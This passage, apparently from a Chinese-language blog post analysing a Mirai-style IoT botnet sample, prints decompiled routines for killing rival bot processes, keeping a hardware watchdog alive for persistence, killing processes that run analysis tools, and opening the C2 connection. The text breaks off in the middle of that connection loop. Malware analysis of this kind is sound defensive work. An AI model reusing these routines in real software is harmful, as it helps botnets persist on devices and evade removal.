class="number">5</span>);</span><br><span class="line">  util_memcpy(v69, <span class="string">&quot;KCeT\&quot;&quot;</span>, <span class="number">5</span>);</span><br><span class="line">  word_2DA4C = <span class="number">5</span>;</span><br><span class="line">  dword_2DA48 = v69;</span><br><span class="line">  v70 = <span class="built_in">malloc</span>(<span class="number">23</span>);</span><br><span class="line">  util_memcpy(v70, &amp;unk_21040, <span class="number">23</span>);</span><br><span class="line">  word_2DA54 = <span class="number">23</span>;</span><br><span class="line">  dword_2DA50 = v70;</span><br><span class="line">  v71 = <span class="built_in">malloc</span>(<span class="number">83</span>);</span><br><span class="line">  util_memcpy(v71, &amp;unk_21058, <span class="number">83</span>);</span><br><span class="line">  word_2DA5C = <span class="number">83</span>;</span><br><span class="line">  dword_2DA58 = v71;</span><br><span class="line">  v72 = <span class="built_in">malloc</span>(<span class="number">32</span>);</span><br><span class="line">  util_memcpy(v72, &amp;unk_210AC, <span class="number">32</span>);</span><br><span class="line">  word_2DA64 = <span class="number">32</span>;</span><br><span class="line">  dword_2DA60 = v72;</span><br><span class="line">  v73 = <span class="built_in">malloc</span>(<span class="number">48</span>);</span><br><span class="line">  util_memcpy(v73, &amp;unk_210D0, <span class="number">48</span>);</span><br><span class="line">  word_2DA6C = <span class="number">48</span>;</span><br><span class="line">  dword_2DA68 = v73;</span><br><span class="line">  v74 = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">  util_memcpy(v74, &amp;unk_21104, <span class="number">12</span>);</span><br><span class="line">  word_2DA74 = <span class="number">12</span>;</span><br><span class="line">  dword_2DA70 = v74;</span><br><span class="line">  v75 = <span class="built_in">malloc</span>(<span class="number">9</span>);</span><br><span class="line">  util_memcpy(v75, &amp;unk_21114, <span class="number">9</span>);</span><br><span class="line">  word_2DA7C = <span class="number">9</span>;</span><br><span class="line">  dword_2DA78 = v75;</span><br><span class="line">  v76 = <span class="built_in">malloc</span>(<span class="number">10</span>);</span><br><span class="line">  util_memcpy(v76, &amp;unk_21120, <span class="number">10</span>);</span><br><span class="line">  word_2DA84 = <span class="number">10</span>;</span><br><span class="line">  dword_2DA80 = v76;</span><br><span class="line">  v77 = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">  util_memcpy(v77, &amp;unk_2112C, <span class="number">12</span>);</span><br><span class="line">  word_2DA8C = <span class="number">12</span>;</span><br><span class="line">  dword_2DA88 = v77;</span><br><span class="line">  v78 = <span class="built_in">malloc</span>(<span class="number">16</span>);</span><br><span class="line">  util_memcpy(v78, &amp;unk_2113C, <span class="number">16</span>);</span><br><span class="line">  word_2DA94 = <span class="number">16</span>;</span><br><span class="line">  dword_2DA90 = v78;</span><br><span class="line">  v79 = <span class="built_in">malloc</span>(<span class="number">19</span>);</span><br><span class="line">  util_memcpy(v79, &amp;unk_21150, <span class="number">19</span>);</span><br><span class="line">  word_2DA9C = <span class="number">19</span>;</span><br><span class="line">  dword_2DA98 = v79;</span><br><span class="line">  v80 = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line">  util_memcpy(v80, <span class="string">&quot;AJWLIGF\&quot;&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  word_2DAA4 = <span class="number">8</span>;</span><br><span class="line">  dword_2DAA0 = v80;</span><br><span class="line">  v81 = <span class="built_in">malloc</span>(<span class="number">11</span>);</span><br><span class="line">  util_memcpy(v81, &amp;unk_2104C, <span class="number">11</span>);</span><br><span class="line">  word_2DAAC = <span class="number">11</span>;</span><br><span class="line">  dword_2DAA8 = v81;</span><br><span class="line">  v82 = <span class="built_in">malloc</span>(<span class="number">12</span>);</span><br><span class="line">  util_memcpy(v82, &amp;unk_21170, <span class="number">12</span>);</span><br><span class="line">  word_2DAB4 = <span class="number">12</span>;</span><br><span class="line">  dword_2DAB0 = v82;</span><br><span class="line">  v83 = <span class="built_in">malloc</span>(<span class="number">18</span>);</span><br><span class="line">  util_memcpy(v83, &amp;unk_21180, <span class="number">18</span>);</span><br><span class="line">  word_2DABC = <span class="number">18</span>;</span><br><span class="line">  dword_2DAB8 = v83;</span><br><span class="line">  v84 = <span class="built_in">malloc</span>(<span class="number">25</span>);</span><br><span class="line">  util_memcpy(v84, &amp;unk_21194, <span class="number">25</span>);</span><br><span class="line">  word_2DAC4 = <span class="number">25</span>;</span><br><span class="line">  dword_2DAC0 = v84;</span><br><span class="line">  v85 = <span class="built_in">malloc</span>(<span class="number">111</span>);</span><br><span class="line">  util_memcpy(v85, &amp;unk_211B0, <span class="number">111</span>);</span><br><span class="line">  word_2DACC = <span class="number">111</span>;</span><br><span class="line">  dword_2DAC8 = v85;</span><br><span class="line">  v86 = <span class="built_in">malloc</span>(<span class="number">111</span>);</span><br><span class="line">  util_memcpy(v86, &amp;unk_21220, <span class="number">111</span>);</span><br><span class="line">  word_2DAD4 = <span class="number">111</span>;</span><br><span class="line">  dword_2DAD0 = v86;</span><br><span class="line">  v87 = <span class="built_in">malloc</span>(<span class="number">110</span>);</span><br><span class="line">  util_memcpy(v87, &amp;unk_21290, <span class="number">110</span>);</span><br><span class="line">  word_2DADC = <span class="number">110</span>;</span><br><span class="line">  dword_2DAD8 = v87;</span><br><span class="line">  v88 = <span class="built_in">malloc</span>(<span class="number">110</span>);</span><br><span class="line">  util_memcpy(v88, &amp;unk_21300, <span class="number">110</span>);</span><br><span class="line">  word_2DAE4 = <span class="number">110</span>;</span><br><span class="line">  dword_2DAE0 = v88;</span><br><span class="line">  v89 = <span class="built_in">malloc</span>(<span class="number">117</span>);</span><br><span class="line">  util_memcpy(v89, &amp;unk_21370, <span class="number">117</span>);</span><br><span class="line">  word_2DAEC = <span class="number">117</span>;</span><br><span class="line">  dword_2DAE8 = v89;</span><br><span class="line">  v90 = <span class="built_in">malloc</span>(<span class="number">64</span>);</span><br><span class="line">  util_memcpy(v90, &amp;unk_213E8, <span class="number">64</span>);</span><br><span class="line">  word_2DAF4 = <span class="number">64</span>;</span><br><span class="line">  dword_2DAF0 = v90;</span><br><span class="line">  v91 = <span class="built_in">malloc</span>(<span class="number">123</span>);</span><br><span class="line">  util_memcpy(v91, &amp;unk_2142C, <span class="number">123</span>);</span><br><span class="line">  word_2DAFC = <span class="number">123</span>;</span><br><span class="line">  dword_2DAF8 = v91;</span><br><span class="line">  v92 = <span class="built_in">malloc</span>(<span class="number">103</span>);</span><br><span class="line">  util_memcpy(v92, &amp;unk_214A8, <span class="number">103</span>);</span><br><span class="line">  word_2DB04 = <span class="number">103</span>;</span><br><span class="line">  dword_2DB00 = v92;</span><br><span class="line">  v93 = <span class="built_in">malloc</span>(<span class="number">123</span>);</span><br><span class="line">  util_memcpy(v93, &amp;unk_21510, <span class="number">123</span>);</span><br><span class="line">  word_2DB0C = <span class="number">123</span>;</span><br><span class="line">  dword_2DB08 = v93;</span><br><span class="line">  v94 = <span class="built_in">malloc</span>(<span class="number">80</span>);</span><br><span class="line">  util_memcpy(v94, &amp;unk_2158C, <span class="number">80</span>);</span><br><span class="line">  word_2DB14 = <span class="number">80</span>;</span><br><span class="line">  dword_2DB10 = v94;</span><br><span class="line">  v95 = <span class="built_in">malloc</span>(<span class="number">82</span>);</span><br><span class="line">  util_memcpy(v95, &amp;unk_215E0, <span class="number">82</span>);</span><br><span class="line">  word_2DB1C = <span class="number">82</span>;</span><br><span class="line">  dword_2DB18 = v95;</span><br><span class="line">  v96 = <span class="built_in">malloc</span>(<span class="number">82</span>);</span><br><span class="line">  util_memcpy(v96, &amp;unk_21634, <span class="number">82</span>);</span><br><span class="line">  word_2DB24 = <span class="number">82</span>;</span><br><span class="line">  dword_2DB20 = v96;</span><br><span class="line">  v97 = <span class="built_in">malloc</span>(<span class="number">82</span>);</span><br><span class="line">  util_memcpy(v97, &amp;unk_21688, <span class="number">82</span>);</span><br><span class="line">  word_2DB2C = <span class="number">82</span>;</span><br><span class="line">  dword_2DB28 = v97;</span><br><span class="line">  v98 = <span class="built_in">malloc</span>(<span class="number">83</span>);</span><br><span class="line">  util_memcpy(v98, &amp;unk_216DC, <span class="number">83</span>);</span><br><span class="line">  word_2DB3C = <span class="number">83</span>;</span><br><span class="line">  dword_2DB38 = v98;</span><br><span class="line">  v99 = <span class="built_in">malloc</span>(<span class="number">101</span>);</span><br><span class="line">  util_memcpy(v99, &amp;unk_21730, <span class="number">101</span>);</span><br><span class="line">  word_2DB44 = <span class="number">101</span>;</span><br><span class="line">  dword_2DB40 = v99;</span><br><span class="line">  v100 = <span class="built_in">malloc</span>(<span class="number">23</span>);</span><br><span class="line">  result = util_memcpy(v100, &amp;unk_21798, <span class="number">23</span>);</span><br><span class="line">  word_2DB4C = <span class="number">23</span>;</span><br><span class="line">  dword_2DB48 = v100;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="SOCKET初始化"><a href="#SOCKET初始化" class="headerlink" title="SOCKET初始化"></a>SOCKET初始化</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521182150.png"
                      alt="20250521182150"
                ></p>
<p>功能解释图：</p>
<blockquote>
<p>┌──────────── socket(AF_INET, SOCK_STREAM)<br>│<br>├─&gt; setsockopt(SO_REUSEADDR)<br>│<br>├─&gt; fcntl → 设置为非阻塞<br>│<br>├─&gt; 设置本地地址:<br>│     ├─ local_bind_4731 &#x3D;&#x3D; true ? 随机地址 : LOCAL_ADDR<br>│     └─ 设置端口为 22831<br>│<br>├─&gt; bind(socket, addr)<br>│     ├─ 成功 → listen(socket, 1)<br>│     └─ 失败:<br>│         ├─ 打印调试信息 (table val 4)<br>│         ├─ connect(socket, 0.0.0.0:22831)<br>│         └─ close &amp; exit</p>
</blockquote>
<p>&#x3D;&#x3D;恶意行为分析两点：<code>local_bind_4731</code>用于伪装或混淆绑定地址，可能绕过检测或防火墙策略。&#x3D;&#x3D;</p>
<h1 id="对抗分析"><a href="#对抗分析" class="headerlink" title="对抗分析"></a>对抗分析</h1><p>在完成上述操作之后，进行了一系列对抗操作：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521182742.png"
                      alt="20250521182742"
                ><br>这里进行的操作有：将命令行参数复制，注册攻击方法，竞争性独占设备，“看门狗欺骗”，针对网络程序（包括netstat，cutl等）操作。</p>
<h3 id="1-竞争性独占设备"><a href="#1-竞争性独占设备" class="headerlink" title="1.竞争性独占设备"></a>1.竞争性独占设备</h3><p>该功能通过调用<code>killer_init</code>函数完成：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521183038.png"
                      alt="20250521183038"
                ><br>该函数封装了<code>killer_condi</code>函数，并且进行了fork：</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">int killer_condi()</span><br><span class="line">&#123;</span><br><span class="line">  int result; // r0</span><br><span class="line">  int v1; // r6</span><br><span class="line">  int v2; // r0</span><br><span class="line">  const char *v3; // r5</span><br><span class="line">  int v4; // r7</span><br><span class="line">  int v5; // r5</span><br><span class="line">  _BYTE v6[512]; // [sp+0h] [bp-418h] BYREF</span><br><span class="line">  _BYTE v7[256]; // [sp+200h] [bp-218h] BYREF</span><br><span class="line">  _BYTE v8[4]; // [sp+300h] [bp-118h] BYREF</span><br><span class="line">  __int16 v9; // [sp+306h] [bp-112h] BYREF</span><br><span class="line"></span><br><span class="line">  result = opendir(&quot;/proc&quot;);</span><br><span class="line">  v1 = result;</span><br><span class="line">  if ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = readdir(v1);</span><br><span class="line">      if ( !v2 )</span><br><span class="line">        break;</span><br><span class="line">      while ( *(_BYTE *)(v2 + 10) == 4 )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (const char *)(v2 + 11);</span><br><span class="line">        v4 = atol(v2 + 11);</span><br><span class="line">        if ( v4 &lt;= 0 )</span><br><span class="line">          break;</span><br><span class="line">        snprintf(v6, 512, &quot;/proc/%s/status&quot;, v3);</span><br><span class="line">        v5 = fopen(v6, &quot;r&quot;);</span><br><span class="line">        if ( !v5 )</span><br><span class="line">          break;</span><br><span class="line">        memset(v7, 0, sizeof(v7));</span><br><span class="line">        while ( fgets(v8, 256, v5) )</span><br><span class="line">        &#123;</span><br><span class="line">          if ( !strncmp(v8, &quot;Name:&quot;, 5) )</span><br><span class="line">          &#123;</span><br><span class="line">            sscanf(&amp;v9, &quot;%s&quot;, v7);</span><br><span class="line">            break;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if ( !strcoll(v7, &quot;/bin/busybox&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/bin/systemd&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/usr/bin&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;test&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/tmp/condi&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/tmp/zxcr9999&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/tmp/condinetwork&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/var/condibot&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/var/zxcr9999&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/var/CondiBot&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/var/condinet&quot;)</span><br><span class="line">          || !strcoll(v7, &quot;/bin/watchdog&quot;) )</span><br><span class="line">        &#123;</span><br><span class="line">          kill(v4, 9);</span><br><span class="line">          fclose(v5);</span><br><span class="line">          closedir(v1);</span><br><span class="line">          return sleep(5);</span><br><span class="line">        &#125;</span><br><span class="line">        fclose(v5);</span><br><span class="line">        v2 = readdir(v1);</span><br><span class="line">        if ( !v2 )</span><br><span class="line">          goto LABEL_23;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">LABEL_23:</span><br><span class="line">    closedir(v1);</span><br><span class="line">    return sleep(5);</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>详细分析该函数：该函数通过打开进程列表，针对有效的PID，打开其<code>/proc/[pid]/status</code>文件，寻找对应进程名，进行匹配，如果匹配到预定义的进程名：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521183320.png"
                      alt="20250521183320"
                ><br>则将对应进程结束。</p>
<h2 id="2-看门狗欺骗"><a href="#2-看门狗欺骗" class="headerlink" title="2.看门狗欺骗"></a>2.看门狗欺骗</h2><p>该功能通过调用<code>watchdog_maintain</code>完成：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">watchdog_maintain</span><span class="params">(<span class="type">int</span> a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  _BOOL4 v2; <span class="comment">// r3</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v10; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v11; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> val; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v13; <span class="comment">// [sp+4h] [bp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  result = fork(a1);</span><br><span class="line">  v2 = result == <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( result &gt; <span class="number">0</span> )</span><br><span class="line">    v2 = <span class="number">1</span>;</span><br><span class="line">  watchdog_pid = result;</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    v13 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      table_unlock_val(<span class="number">35</span>);</span><br><span class="line">      table_unlock_val(<span class="number">36</span>);</span><br><span class="line">      table_unlock_val(<span class="number">37</span>);</span><br><span class="line">      table_unlock_val(<span class="number">38</span>);</span><br><span class="line">      table_unlock_val(<span class="number">39</span>);</span><br><span class="line">      table_unlock_val(<span class="number">40</span>);</span><br><span class="line">      table_unlock_val(<span class="number">41</span>);</span><br><span class="line">      table_unlock_val(<span class="number">42</span>);</span><br><span class="line">      table_unlock_val(<span class="number">43</span>);</span><br><span class="line">      val = table_retrieve_val(<span class="number">35</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(val, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v3 = table_retrieve_val(<span class="number">36</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(v3, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v5 = table_retrieve_val(<span class="number">37</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(v5, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v6 = table_retrieve_val(<span class="number">38</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(v6, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v7 = table_retrieve_val(<span class="number">39</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(v7, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v8 = table_retrieve_val(<span class="number">40</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(v8, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v9 = table_retrieve_val(<span class="number">41</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(v9, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v10 = table_retrieve_val(<span class="number">42</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(v10, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      v11 = table_retrieve_val(<span class="number">43</span>, <span class="number">0</span>);</span><br><span class="line">      v4 = open(v11, <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> ( v4 != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      table_lock_val(<span class="number">35</span>);</span><br><span class="line">      table_lock_val(<span class="number">36</span>);</span><br><span class="line">      table_lock_val(<span class="number">37</span>);</span><br><span class="line">      table_lock_val(<span class="number">38</span>);</span><br><span class="line">      table_lock_val(<span class="number">39</span>);</span><br><span class="line">      table_lock_val(<span class="number">40</span>);</span><br><span class="line">      table_lock_val(<span class="number">41</span>);</span><br><span class="line">      table_lock_val(<span class="number">42</span>);</span><br><span class="line">      table_lock_val(<span class="number">43</span>);</span><br><span class="line">      sleep(<span class="number">60</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    ioctl(v4, <span class="number">-2147199228</span>, &amp;v13);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      ioctl(v4, <span class="number">-2147199227</span>, <span class="number">0</span>);</span><br><span class="line">      sleep(<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>该函数是典型的用于<strong>维持Watchdog守护进程持续运行的恶意或嵌入式系统中的持久化函数。他在许多互联网恶意软件中被广泛使用，其目的是防止系统因为看门狗超时而重启，或者借助硬件看门狗让其自身保持常驻。</strong><br>首先，调用fork，拿到子进程pid，保存到watchdog_pid，紫禁城负责持续操作watchdog设备。紧接着，解密对应资源表，这里我自己写出了解密程序：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521184038.png"
                      alt="20250521184038"
                ><br>尝试寻找系统中的Watchdog系统文件，找到后激活watchdog（通过第一次ioctl，启用watchdog设备，让系统开始监听心跳0。<br>完成之后，通过一个while循环，持续喂狗：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">    ioctl(v4, <span class="number">-2147199227</span>, <span class="number">0</span>); <span class="comment">// ioctl(fd, WDIOC_KEEPALIVE, 0);</span></span><br><span class="line">    sleep(<span class="number">10</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<h2 id="3-命令防护"><a href="#3-命令防护" class="headerlink" title="3.命令防护"></a>3.命令防护</h2><p>该功能通过调用<code>lock_commands</code>函数实现：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">lock_commands</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v0; <span class="comment">// r9</span></span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// r10</span></span><br><span class="line">  <span class="type">int</span> result; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// r7</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *v5; <span class="comment">// r5</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// r0</span></span><br><span class="line">  <span class="type">bool</span> v7; <span class="comment">// zf</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// r6</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// r8</span></span><br><span class="line">  <span class="type">char</span> **v10; <span class="comment">// r4</span></span><br><span class="line">  <span class="type">char</span> *v11; <span class="comment">// t1</span></span><br><span class="line">  _BYTE v12[<span class="number">4096</span>]; <span class="comment">// [sp+0h] [bp-2020h] BYREF</span></span><br><span class="line">  _BYTE v13[<span class="number">4128</span>]; <span class="comment">// [sp+1000h] [bp-1020h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v0 = getpid();</span><br><span class="line">  v1 = getppid();</span><br><span class="line">  result = opendir(<span class="string">&quot;/proc&quot;</span>);</span><br><span class="line">  v3 = result;</span><br><span class="line">  <span class="keyword">if</span> ( result )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = readdir(v3);</span><br><span class="line">      <span class="keyword">if</span> ( !v4 )</span><br><span class="line">        <span class="keyword">return</span> closedir(v3);</span><br><span class="line">      <span class="keyword">while</span> ( (*((_WORD *)_ctype_b + *(<span class="type">unsigned</span> __int8 *)(v4 + <span class="number">11</span>)) &amp; <span class="number">8</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v5 = (<span class="type">const</span> <span class="type">char</span> *)(v4 + <span class="number">11</span>);</span><br><span class="line">        v6 = atol(v4 + <span class="number">11</span>);</span><br><span class="line">        v7 = v1 == v6;</span><br><span class="line">        <span class="keyword">if</span> ( v1 != v6 )</span><br><span class="line">          v7 = v0 == v6;</span><br><span class="line">        v8 = v6;</span><br><span class="line">        <span class="keyword">if</span> ( v7 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="built_in">snprintf</span>(v13, <span class="number">4096</span>, <span class="string">&quot;/proc/%s/cmdline&quot;</span>, v5);</span><br><span class="line">        v9 = fopen(v13, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> ( !v9 )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( fgets(v12, <span class="number">4096</span>, v9) &amp;&amp; blacklisted_cmds[<span class="number">0</span>] )</span><br><span class="line">        &#123;</span><br><span class="line">          v10 = blacklisted_cmds;</span><br><span class="line">          <span class="keyword">while</span> ( !<span class="built_in">strstr</span>(v12) )</span><br><span class="line">          &#123;</span><br><span class="line">            v11 = v10[<span class="number">1</span>];</span><br><span class="line">            ++v10;</span><br><span class="line">            <span class="keyword">if</span> ( !v11 )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">          &#125;</span><br><span class="line">          kill(v8, <span class="number">9</span>);</span><br><span class="line">        &#125;</span><br><span class="line">LABEL_14:</span><br><span class="line">        fclose(v9);</span><br><span class="line">        v4 = readdir(v3);</span><br><span class="line">        <span class="keyword">if</span> ( !v4 )</span><br><span class="line">          <span class="keyword">return</span> closedir(v3);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<p>该函数是恶意代码中常见的一种命令防护机制，用于杀死运行某些特定命令的进程，这些命令常用于安全研究人员来探测，控制，清除恶意程序。<br>首先，打开进程列表，找到每个进程的对应目录（并且跳过当前进程和父进程），构造目录：<code>/proc/[pid]/cmdline</code>，成功打开之后，通过比对预定义命令，将其清除。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/Sample_analysis/20250521184746.png"
                      alt="20250521184746"
                ></p>
<h1 id="C2连接"><a href="#C2连接" class="headerlink" title="C2连接"></a>C2连接</h1><p>在完成初始化之后，样本将连接到C2，这里使用了一个循环：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span> ( <span class="number">1</span> )                         <span class="comment">// 该循环确认与C&amp;C正确连接</span></span><br><span class="line">            &#123;</span><br><span class="line">              <span class="keyword">do</span></span><br><span class="line">              &#123;</span><br><span class="line">                <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">                &#123;</span><br><span class="line">                  <span class="keyword">do</span></span><br><span class="line">                  &#123;</span><br><span class="line">                    v48[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> ( i = <span class="number">1</span>; i != <span class="number">32</span>; ++i )</span><br><span class="line">                      v48[i] = <span class="number">0</span>;</span><br><span class="line">                    v47[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">for</span> ( j = <span class="number">1</span>; j != <span class="number">32</span>; ++j )</span><br><span class="line">                      v47[j] = <span class="number">0</span>;</span><br><span class="line">                    <span class="keyword">if</span> ( fd_ctrl != <span class="number">-1</span> )</span><br><span class="line">                      *(_DWORD *)&amp;v58[<span class="number">2</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)fd_ctrl &gt;&gt; <span class="number">5</span>) - <span class="number">103</span>] |= <span class="number">1</span> &lt;&lt; (fd_ctrl &amp; <span class="number">0x1F</span>);</span><br><span class="line">                    <span class="keyword">if</span> ( fd_serv == <span class="number">-1</span> )</span><br><span class="line">                    &#123;</span><br><span class="line">                      v30 = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">                      v31 = v30;</span><br><span class="line">                      fd_serv = v30;</span><br><span class="line">                      <span class="keyword">if</span> ( v30 != <span class="number">-1</span> )</span><br><span class="line">                      &#123;</span><br><span class="line">                        v32 = fcntl(v30, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line">                        v33 = fcntl(v31, <span class="number">4</span>, v32 | <span class="number">0x800</span>);</span><br><span class="line">                        <span class="keyword">if</span> ( resolve_func )</span><br><span class="line">                          resolve_func(v33);    <span class="comment">// resolve_cnc_addr</span></span><br><span class="line">                        pending_connection = <span class="number">1</span>;</span><br><span class="line">                        connect(fd_serv, &amp;srv_addr, <span class="number">16</span>);</span><br><span class="line">                      &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    v22 = fd_serv;</span><br><span class="line">                    <span class="keyword">if</span> ( pending_connection )</span><br><span class="line">                      *(_DWORD *)&amp;v58[<span class="number">2</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)fd_serv &gt;&gt; <span class="number">5</span>) - <span class="number">167</span>] |= <span class="number">1</span> &lt;&lt; (fd_serv &amp; <span class="number">0x1F</span>);</span><br><span class="line">                    <span class="keyword">else</span></span><br><span class="line">                      *(_DWORD *)&amp;v58[<span class="number">2</span> * ((<span class="type">unsigned</span> <span class="type">int</span>)fd_serv &gt;&gt; <span class="number">5</span>) - <span class="number">103</span>] |= <span class="number">1</span> &lt;&lt; (fd_serv &amp; <span class="number">0x1F</span>);</span><br><span class="line">                    v23 = fd_ctrl;</span><br><span class="line">                    <span class="keyword">if</span> ( v22 &gt;= fd_ctrl )</span><br><span class="line">                      v23 = v22;</span><br><span 